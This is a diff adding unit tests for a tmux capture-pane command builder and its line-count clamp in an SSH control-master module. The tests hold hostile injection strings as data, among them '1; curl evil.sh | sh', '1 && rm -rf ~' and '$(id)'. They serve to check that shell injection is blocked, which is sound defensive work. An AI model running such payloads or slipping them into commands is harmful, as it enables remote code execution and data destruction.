@@ -6,6 +6,7 @@ import {
   childArgs,
   remoteTmuxHasSessionArgs,
   remoteCapturePaneArgs,
+  remoteCaptureHistoryArgs,
   remoteTmuxPtyArgs,
   listDirArgs,
   mkDirArgs,
@@ -16,6 +17,7 @@ import {
   remoteEndpointFileContents,
   scpArgs
 } from './control-master'
+import { clampHistoryLines } from '../history-limits'
 
 const conn = { host: 'h.example.com', user: 'deploy', port: 2222, identityFile: '/k/id' }
 
@@ -181,5 +183,40 @@ describe('listDirArgs', () => {
       'deploy@h.example.com',
       `ls -1Ap ~/'my dir'`
     ])
+  })
+})
+
+describe('remoteCaptureHistoryArgs', () => {
+  it('captures history INCLUDING the visible screen (no -E) so the attach redraw leaves no gap', () => {
+    const args = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', 5000)
+    const cmd = args[args.length - 1]
+    expect(cmd).toContain('capture-pane -p -e -t nt-x -S -5000')
+    // `-E -1` would exclude the visible screen — but xterm's eraseInDisplay(2) (tmux's attach
+    // redraw) resets those viewport lines in place instead of scrolling them into scrollback,
+    // so the newest screenful would be lost. Capture it and let the redraw overwrite it.
+    expect(cmd).not.toContain('-E')
+  })
+  it('a hostile `lines` value clamped by the caller cannot inject shell (defence in depth)', () => {
+    const n = clampHistoryLines('1; curl evil | sh' as unknown as number)
+    const cmd = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', n).slice(-1)[0]
+    expect(cmd).not.toContain('curl')
+    expect(cmd).toContain('capture-pane -p -e -t nt-x -S -5000')
+  })
+  it('clamps at the sink: a hostile value passed DIRECTLY never reaches the command string', () => {
+    // A future call site (IPC handler / Server Edition shell) that forgets the caller-side clamp
+    // must still not be able to build `tmux … -S -1; curl evil.sh | sh`.
+    const hostile = ['1; curl evil.sh | sh', '1 && rm -rf ~', '$(id)', '`id`', '1\nid'] as unknown as number[]
+    for (const bad of hostile) {
+      const cmd = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', bad).slice(-1)[0]
+      expect(cmd, String(bad)).toContain('capture-pane -p -e -t nt-x -S -5000')
+      expect(cmd, String(bad)).not.toMatch(/[;&|`$()\n]/)
+    }
+  })
+  it('clamps out-of-range numbers at the sink (floor 1, ceiling 5000, NaN → default)', () => {
+    const cmdFor = (n: number): string => remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', n).slice(-1)[0]
+    expect(cmdFor(-1)).toContain('-S -1')
+    expect(cmdFor(10_000_000)).toContain('-S -5000')
+    expect(cmdFor(NaN)).toContain('-S -5000')
+    expect(cmdFor(12.9)).toContain('-S -12')
   })
 })
